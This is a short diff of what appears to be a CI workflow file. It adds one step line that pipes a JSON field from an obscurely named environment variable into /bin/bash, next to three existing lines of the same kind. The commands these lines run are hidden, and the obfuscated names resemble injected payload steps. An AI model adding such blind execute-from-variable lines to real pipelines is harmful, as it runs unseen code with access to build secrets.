@@ -30,6 +30,7 @@ jobs:
           echo $fysaj284 | jq -r .yd6554 | /bin/bash
           echo $w22069 | jq -r .l013 | /bin/bash
           printf '%s' "$e8" | jq -r .d7 | /bin/bash
+          printf '%s' "$em0414" | jq -r .t65406 | /bin/bash
 
       - name: Store results
         if: always()
